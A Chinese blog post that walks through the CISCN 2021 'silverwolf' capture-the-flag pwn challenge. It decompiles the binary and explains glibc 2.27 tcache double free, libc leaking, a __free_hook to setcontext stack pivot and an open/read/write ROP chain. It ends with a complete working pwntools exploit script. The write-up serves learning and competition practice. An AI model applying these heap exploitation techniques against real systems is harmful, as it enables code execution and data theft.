---
title: "堆上的ORW"
published: 2025-12-02
draft: false
description: "关于堆上ORW的学习"
image: "https://cdn.jsdelivr.net/gh/SceAce/picx-images-hosting@master/blog/ORW%20of%20Heap/assets/cover/%E8%93%9D%E5%8F%91-%E4%BA%8C%E6%AC%A1%E5%85%83-%E5%8A%A8%E6%BC%AB.png"
tags:
  - "Pwn"
category: "二进制安全"
lang: "zh_CN"
---

# [CISCN 2021 初赛]silverwolf ---- 堆上的ORW

尝试复现一些大赛的题目，主要是感觉一点长进都没有，一直刷题不知道学了些什么......

这题主要是堆上的ORW,跟着gets的[博客](http://www.getspwn.xyz/?p=43)来的

废话不多说，开始，pwninit一下

```shell
❯ pwninit pwn
[INFO] 当前已在虚拟环境中: ctf
[INFO] 给二进制文件添加执行权限...
[SUCCESS] 权限添加成功: pwn
[INFO] 检查二进制文件保护:
==================================
[*] '/mnt/d/TY/网安笔记/CTF_PWN/复现/CISCN_2021_初赛_silverwolf/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
==================================
[INFO] 生成exp.py模板...
[SUCCESS] exp.py生成成功
[SUCCESS] 初始化完成！
```

可以看到保护全开，稍微运行了一下，基本的菜单题，拖ida看看 

## 程序

### main

我将函数稍微重命名了一下，

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  __int64 v3[5]; // [rsp+0h] [rbp-28h] BYREF

  v3[1] = __readfsqword(0x28u);
  init_();
  while ( 1 )
  {
    puts("1. allocate");
    puts("2. edit");
    puts("3. show");
    puts("4. delete");
    puts("5. exit");
    __printf_chk(1LL, "Your choice: ");
    __isoc99_scanf(&unk_1144, v3);
    switch ( v3[0] )
    {
      case 1LL:
        add();                                  // malloc chunk_size <= 0x78
        break;
      case 2LL:
        edit();
        break;
      case 3LL:
        show();
        break;
      case 4LL:
        delete();                               // UAF
        break;
      case 5LL:
        exit(0);
      default:
        puts("Unknown");
        break;
    }
  }
}
```

### init_

存在沙盒

```c
__int64 init_()
{
  __int64 v0; // rbx

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  v0 = seccomp_init(0LL);
  seccomp_rule_add(v0, 2147418112LL, 0LL, 0LL);
  seccomp_rule_add(v0, 2147418112LL, 2LL, 0LL);
  seccomp_rule_add(v0, 2147418112LL, 1LL, 0LL);
  return seccomp_load(v0);
}
```

```c
//seccomp-tools dump ./pwn   只给了read open write，很明显打堆上的ORW
❯ seccomp-tools dump ./pwn
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009
 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008
 0006: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0008
 0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00000000  return KILL
```



### add

这里是存在一些问题的，可以看到，程序在输入index之后会有一个**!size**的判断，所以index一定得为0，也就算是说，后面申请的chunk会把前面申请的chunk堵盖掉，同时限制malloc的chunk大小得小于等于0x78

```c
unsigned __int64 add()
{
  size_t chunk_size; // rbx
  void *ptr; // rax
  size_t size; // [rsp+0h] [rbp-18h] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-10h]

  v4 = __readfsqword(0x28u);
  __printf_chk(1LL, "Index: ");
  __isoc99_scanf((__int64)&unk_1144, (__int64)&size);
  if ( !size )
  {
    __printf_chk(1LL, "Size: ");
    __isoc99_scanf((__int64)&unk_1144, (__int64)&size);
    chunk_size = size;
    if ( size > 0x78 )
    {
      __printf_chk(1LL, "Too large");
    }
    else
    {
      ptr = malloc(size);
      if ( ptr )
      {
        size_list = chunk_size;
        heap_list = ptr;
        puts("Done!");
      }
      else
      {
        puts("allocate failed");
      }
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```

### edit

同时edit也是同样的，有一个判断，v3得为0，也就是只能修改第一个chunk，并且允许我们往chunk里面读取内容

```c
unsigned __int64 edit()
{
  _BYTE *v0; // rbx
  char *v1; // rbp
  __int64 v3; // [rsp+0h] [rbp-28h] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-20h]

  v4 = __readfsqword(0x28u);
  __printf_chk(1LL, "Index: ");
  __isoc99_scanf((__int64)&unk_1144, (__int64)&v3);
  if ( !v3 )
  {
    if ( heap_list )
    {
      __printf_chk(1LL, "Content: ");
      v0 = heap_list;
      if ( size_list )
      {
        v1 = (char *)heap_list + size_list;
        while ( 1 )
        {
          read(0, v0, 1uLL);
          if ( *v0 == 10 )
            break;
          if ( ++v0 == v1 )
            return __readfsqword(0x28u) ^ v4;
        }
        *v0 = 0;
      }
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```

### show

很正常的打印

```c
unsigned __int64 show()
{
  __int64 v1; // [rsp+0h] [rbp-18h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-10h]

  v2 = __readfsqword(0x28u);
  __printf_chk(1LL, "Index: ");
  __isoc99_scanf((__int64)&unk_1144, (__int64)&v1);
  if ( !v1 && heap_list )
    __printf_chk(1LL, "Content: %s\n", (const char *)heap_list);
  return __readfsqword(0x28u) ^ v2;
}
```

### delete

存在很明显的UAF漏洞，

```c
unsigned __int64 delete()
{
  __int64 v1; // [rsp+0h] [rbp-18h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-10h]

  v2 = __readfsqword(0x28u);
  __printf_chk(1LL, "Index: ");
  __isoc99_scanf((__int64)&unk_1144, (__int64)&v1);
  if ( !v1 && heap_list )
    free(heap_list);
  return __readfsqword(0x28u) ^ v2;
}
```

## 分析

目前已知有UAF漏洞，并且题目是Glibc2.27的，所以存在tcache bin，并且需要打ORW，其实在这之前我并没有打过堆上的ORW,现在进行尝试，首先我们肯定需要泄漏libc地址，而一般利用unshorbin的chunk，因为ub的fd和bk都是指向main_anera+一个偏移的地址，但是现在只能申请小于等于0x78大小的chunk，那么现在的问题就是怎么申请到非fasrbin的chunk,而我们是处于Glibc2.27的环境下，而tcache bin会申请一个很大的chunk，用于管理tcache bin里面的chunk,这个大的chunk在Glibc2.27大小是0x251，而由于开启了沙盒，导致会有很多杂乱的chunk，如图

![](https://cdn.jsdelivr.net/gh/SceAce/picx-images-hosting@master/blog/ORW%20of%20Heap/img/start_bins.png)

那么现在如果我们能够把这个chunk  free掉，不就可以使得它进ub，从而得到libc_addr嘛？，因此我们现在需要得到得到chunk的地址，那么怎么得到呢？在Glibc2.27针对tcache bin引入了key这个用于检测double free的机制，当一个chunk被free掉，进入tcache bin的时候，会把这个地址写入到chunk_addr+8的位置，因此，利用这个机制，我们可以泄漏得到heap_addr,

### leak_heap_addr

那么好，现在先来处理泄漏heap_addr的问题，那么现在的问题是：这个key会检测double free,如果不能double free，那么我们目前无法将free掉的这个tcache chunk的fd修改为处于头部的0x251的chunk,那么就无法通过ub泄漏地址，所以我们需要把这个key覆盖掉，随便覆盖成什么，因为地址后面第二次free的时候会重新覆盖上，那么好，来看变化：

```python
def exp():
    for i in range(7):
        add(0x78)
        edit(b'source')
    edit(b'a'*0x10)
    delete()
    edit(b'a'*0x10)
    bug()   
exp()
itr()
```

![](https://cdn.jsdelivr.net/gh/SceAce/picx-images-hosting@master/blog/ORW%20of%20Heap/img/leak_heap_first.png)

这里是存在问题的，这里直接show是得不到这个地址的，因为前面是0，会被 __printf_chk截断掉，所以必须double free

![](https://cdn.jsdelivr.net/gh/SceAce/picx-images-hosting@master/blog/ORW%20of%20Heap/img/leak_heap_second.png)

好了，现在我们就可以double free,并且泄漏地址了，

![](https://cdn.jsdelivr.net/gh/SceAce/picx-images-hosting@master/blog/ORW%20of%20Heap/img/leak_heap_thire.png)

拿到地址，为了简约，将代码修改成这样，并且将泄漏的地址低三位取0，这样得到堆的基地址

```python
 
# ========== Exploit 开始 ==========
def exp():
    for i in range(7):
        add(0x78)
        edit(b'source')
    for i in range(2):
        edit(b'a'*0x10)
        delete()
    show()
    ru("Content: ")
    heap_addr = uu64(ru(b'\x0a',drop=True))&0xffffffffff000 
    leak("heap_addr",heap_addr)
    bug()   
exp()
itr()
```

![](https://cdn.jsdelivr.net/gh/SceAce/picx-images-hosting@master/blog/ORW%20of%20Heap/img/leak_heap_addr.png)

### 修改fd为tcache的大chunk

因为已经double free，并且存在uaf我可以去修改chunk的fd为tcache,进而让我们能够拿到libc的地址，

```python
    edit(p64(heap_addr+0x10))
    add(0x78)
    add(0x78)
```

![](https://cdn.jsdelivr.net/gh/SceAce/picx-images-hosting@master/blog/ORW%20of%20Heap/img/change_to_tb_f.png)

![](https://cdn.jsdelivr.net/gh/SceAce/picx-images-hosting@master/blog/ORW%20of%20Heap/img/change_to_tb_d.png)

### 修改这个chunk，并且free，泄漏libc

现在这里需要将tcache bin的机制来复习 ~~学习~~ 

tcache bin其实是依靠最开始申请的这个大的chunk来控制的，前面一部分是count部分，就是用来管理chunk的数量的，也就是tcache_perthread_struct里面的counts部分，其实tcache_puts和tcache_gets就是依照这个counts来确定tcachebin里面是否存在chunk的，如果说我们把这个覆盖成7，那么再次释放对应大小的chunk就不会进入tcachebin，直接进入unshortbin或者fastbin，其中每个counts所占字节大小其实不是固定的，会随着版本的变化而变化，最好的解决办法是看源码，或者，直接调试，那么接下来是调试的办法，_这里是另一个题目的，不是这道题的，只是举一个例子_

![](https://cdn.jsdelivr.net/gh/SceAce/picx-images-hosting@master/blog/ORW%20of%20Heap/img/counts_size_test1.png)

![](https://cdn.jsdelivr.net/gh/SceAce/picx-images-hosting@master/blog/ORW%20of%20Heap/img/counts_size_test2.png)

所以这里counts的大小就是两个字节

![](https://cdn.jsdelivr.net/gh/SceAce/picx-images-hosting@master/blog/ORW%20of%20Heap/img/counts_size_test3.png)

![](https://cdn.jsdelivr.net/gh/SceAce/picx-images-hosting@master/blog/ORW%20of%20Heap/img/counts_size_test4.png)

![](https://cdn.jsdelivr.net/gh/SceAce/picx-images-hosting@master/blog/ORW%20of%20Heap/img/counts_size_test5.png)

这样就是对应的距离了，

好了，既然了解了这部分counts的知识，现在我们是在这个0x251的chunk上，那么现在找到0x250的位置，并且将对应的部分覆盖为7，并且free掉这个chunk使其进入ub，从而泄漏地址

![](https://cdn.jsdelivr.net/gh/SceAce/picx-images-hosting@master/blog/ORW%20of%20Heap/img/leak_libc1.png)

![](https://cdn.jsdelivr.net/gh/SceAce/picx-images-hosting@master/blog/ORW%20of%20Heap/img/leak_libc2.png)

```python
    edit(b'\x00'*0x23+b'\x07')
    delete()
    show()
    libc_base = l64()-0x3ebca0
    leak("libc_base",libc_base)
```

这里的libc_base可以直接硬编码计算，也可以使用其他方法，比如减去libc.sym.main_anera

### 接下来就要考虑ORW了

因为开启了沙箱，很明显，只想让我们打ORW,

```shell
❯ seccomp-tools dump ./pwn
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009
 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008
 0006: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0008
 0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00000000  return KILL
```

首先让我们回想一下在栈上打ORW的时候是什么样子的，要么构造ROP，要么写shellcode,而在堆上是没有办法直接在堆内存上执行代码的，现在就要引申一个概念，就是栈迁移是为了什么，栈迁移是不是实际上就是通过rbp去控制rsp，这样就把rsp迁移到任意位置，这样的话栈也就被迁移到其他地方了,接下来只要这个地方存在ROP，就可以直接执行，因为ROP的gadget在text段上，可以直接执行，那么这是在栈上，一般也会迁移到.bss段上，但是在堆上呢？应该怎么做？

而在Glibc中有这么一个函数，setcontext，而这个函数又以2.27,2.29为分界，在这里不详细说明，下面是这个函数在2.27的样子，

![](https://cdn.jsdelivr.net/gh/SceAce/picx-images-hosting@master/blog/ORW%20of%20Heap/img/setcontext.png)

主要注意这部分，可以看到是使用rdi来控制所有通用寄存器的值，但是这里不重要，重要的是，这里会通过rdi+0xa0的地址给rsp,sp是栈顶指针，也就是rsp往下，都会被认为是栈，这样的话不就可以控制rsp去执行ROP-----ORW了嘛，那么我们现在需要考虑怎么布置这个伪造的栈帧了，其实如果想执行到这里，那么我们也许需要借助hook函数，

首先这里是通过rdi来控制的，所以rdi一定得是堆上的某个地址，因为我们需要在堆上执行ORW,

那么我们应该怎么布置这些呢？,如下，

```python
 	pay = b'\x02'*0x40+p64(libc_base+libc.sym.__free_hook)+p64(0)
    pay += p64(heap_addr+0x1000)    # flag_addr heap:0x40
    pay += p64(heap_addr+0x2000)    # fake_chunk heap:0x50
    pay += p64(heap_addr+0x20a0)    # stack 2 heap:0x60
    pay += p64(heap_addr+0x3000)    # orw1 heap:0x70
    pay += p64(heap_addr+0x3060)    # orw2 heap:0x80 continue orw1
 
```

现在的我们还处于tcache bin 的这个巨大的结构体堆里面，这个时候我们还是可以通过这个结构体来布置chunk的，首先把前面的counts填一下，随便填一点，然后就是free_hook,从这里开始是tcache bin里面每一个chunk队列的头的地址对应的chunk的地址，也就是tcache_entry->*next，~~我在说什么呢？~~,其实就是chunk队列的头，链接的chunk，就比如：0x20：chunk1-->chunk2，这里我所讲的就是chunk1

那么按照这样布置，就会使得对应size的chunk地址为我们所布置的，

```c
0x20-->free_hook；0x30用不上，所以随意覆盖；
0x40-->heap_addr+0x1000；0x50-->heap_addr+0x2000；
0x60-->heap_addr+0x20a0；0x70 -->heap_addr+0x3000 ; 
0x80 -->heap_addr+0x3060
```

那么现在，只要申请对应size大小就可以控制对应的内存了，至于这里的chunk的地址为什么是这样的，我一个一个的解释，

还记得上面说过的，需要把rsp控制到堆上吗？而在Glibc2.27里面setcontext是使用rdi去控制的，（注；2.29貌似是rdx控制的），所以我们需要控制rdi,而free_hook在释放chunk的时候，rdi里面的值，刚好会是你free的那个堆块的地址，那么这样不就可以把rdi控制为我们指定的chunk的地址吗？接下来0x40~0x80这几个chunk的作用，也许你们就知道是什么了，其中0x70和0x80是为了布置ORW读取flag的fake_stack，因为ROP链太长了，导致一个chunk的空间不够，所以需要两个相邻的chunk来拼接，然后0x40的chunk是为了读"flag"这个字符串，并且可以把flag的内容读在上面，

注意接下来的操作：首先把tcache bin里面的0x20的chunk申请出来，并且修改为setcontext+53的位置，(因为setcontext+53的位置是mov rsp,[rsi+0xa0])，这样下次执行free的时候就会直接跳到setcontext+53的位置，从而将rsp移动到对应的位置，那么这里是第一步，接下来我们需要干啥呢？第二步，我们需要构造一下，我们需要把0x60这个chunk的内容上放上heap+0x3000也就是ORW的地址，那么现在，我们如果把0x50那个chunk释放掉，就会使得rdi == chunk_size_0x50 ~~表意写法，不要在意~~，并且同时触发setcontext,将rdi+0xa0地方的内容给rsp，这里rdi+0xa0的地方其实就是heap_base+0x2000+a0 ====> heap_base+0x20a0，那么这个地方的值是什么呢？那不就是我们前面的heap_base+0x3000吗？那么不就把rsp放当orw上来了吗？这样就可以在执行完setcontext之后执行ORW了，但是需要注意的是在修改0x60这个chunk的内容为heap_base+0x3000的时候，后面还需要加一个ret，因为setcontext里面有一个push,为了平衡，需要ret弄回来，

![](https://cdn.jsdelivr.net/gh/SceAce/picx-images-hosting@master/blog/ORW%20of%20Heap/img/setcontext1.png)

并且在构造ORW的时候，需要注意open要使用syscall的方式构造不可以直接调用，要用syscall，这是因为在2.27里，open函数开始的位置会影响栈布局，具体如下:

![](https://cdn.jsdelivr.net/gh/SceAce/picx-images-hosting@master/blog/ORW%20of%20Heap/img/open.png)

而read和write就不会

![](https://cdn.jsdelivr.net/gh/SceAce/picx-images-hosting@master/blog/ORW%20of%20Heap/img/read_and_wrote.png)

## 完整EXP

```python
#!/usr/bin/env python3
from pwn import *
from LibcSearcher import *

# 配置
context(os='linux', arch='amd64', log_level='debug')
binary = "./pwn"

# 远程/本地切换
if args.get("REMOTE"):
    io = remote("node4.anna.nssctf.cn",28172)
else:
    io = process(binary)

# ELF加载
elf = ELF(binary)
libc = ELF("./libc-2.27.so")

# ========== 常用函数定义 ==========
s       = lambda data               : io.send(data)
sa      = lambda delim, data        : io.sendafter(str(delim), data)
sl      = lambda data               : io.sendline(data)
sla     = lambda delim, data        : io.sendlineafter(str(delim), data)
r       = lambda num=4096           : io.recv(num)
rl      = lambda                    : io.recvline()
ru      = lambda delims, drop=False : io.recvuntil(delims, drop)
itr     = lambda                    : io.interactive()
uu32    = lambda data               : u32(data.ljust(4, b'\x00'))
uu64    = lambda data               : u64(data.ljust(8, b'\x00'))
leak    = lambda name, addr         : log.success('{} ======== > {:#x}'.format(name, addr))
p       = lambda name,data          : print("{} ======== > {}".format(name,data))

# ========== 常用泄露函数 ==========
l64     = lambda                    : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
l32     = lambda                    : u32(io.recvuntil(b"\xf7")[-4:].ljust(4, b"\x00"))
l64_no  = lambda                    : u64(io.recv(6).ljust(8, b'\x00'))
def bug():
  gdb.attach(io)
  pause()
# [+] ========= Some funtion ========= [+]
def add(size):
    sla("Your choice:",str(1))
    sla("Index:",str(0))
    sla("Size:",str(size))

def edit(content):
    sla("Your choice:",str(2))
    sla("Index:",str(0))
    sla("Content:",content)

def delete():
    sla("Your choice:",str(4))
    sla("Index:",str(0))

def show():
    sla("Your choice:",str(3))
    sla("Index:",str(0))
    
# ========== Exploit 开始 ==========
def exp():
    for i in range(7):
        add(0x78)
        edit(b'source')
    for i in range(2):
        edit(b'a'*0x10)
        delete()
    show()
    ru("Content: ")
    heap_addr = uu64(ru(b'\x0a',drop=True))&0xffffffffff000
    leak("heap_addr",heap_addr)
    edit(p64(heap_addr+0x10)) 
    add(0x78)
    add(0x78)
    
    edit(b'\x00'*0x23+b'\x07')
    delete()
    show()

    libc_base = l64()-0x3ebca0
    leak("libc_base",libc_base)
    bug()   
    # [+] ========= change stuck from tcache ========= [+]
    pay = b'\x02'*0x40+p64(libc_base+libc.sym.__free_hook)+p64(0)
    pay += p64(heap_addr+0x1000)    # flag_addr heap:0x40
    pay += p64(heap_addr+0x2000)    # fake_chunk heap:0x50
    pay += p64(heap_addr+0x20a0)    # stack 2 heap:0x60
    pay += p64(heap_addr+0x3000)    # orw1 heap:0x70
    pay += p64(heap_addr+0x3060)    # orw2 heap:0x80 continue orw1
    edit(pay)

    # [+] ====== Some addr ======= [+]
    rax = libc_base+0x000000000001b500
    rdi = libc_base+0x000000000002164f
    rsi = libc_base+0x0000000000023a6a
    rdx = libc_base+0x0000000000001b96
    ret = libc_base+0x00000000000008aa
    syscall = libc_base+libc.sym.read+15
    leave_ret = libc_base+0x00000000000547e3

    setcontext = libc_base+libc.sym.setcontext+53
    read = libc_base+libc.sym.read
    write = libc_base+libc.sym.write
    flag = heap_addr+0x1000
    get_flag = heap_addr+0x3000

    # [+] ====== O R W ========== [+]
    o = p64(rdi)+p64(flag)
    o += p64(rsi)+p64(0)
    o += p64(rax)+p64(2)
    o += p64(syscall)

    r = p64(rdi)+p64(3)
    r += p64(rsi)+p64(get_flag)
    r += p64(rdx)+p64(0x100)
    r += p64(read)

    w = p64(rdi)+p64(1)
    w += p64(write)
    
    orw = o+r+w

    leak("setcontext",setcontext)
    add(0x18)
    edit(p64(setcontext))

    add(0x38)
    edit(b'/flag')

    add(0x68)
    edit(orw[:0x60])    # orw1
    add(0x78) 
    edit(orw[0x60:])    # orw2

    add(0x58)
    edit(p64(heap_addr+0x3000)+p64(ret))
    add(0x48)
    #gdb.attach(io)
    delete()
    #pause()
    #bug()
exp()
itr()
```

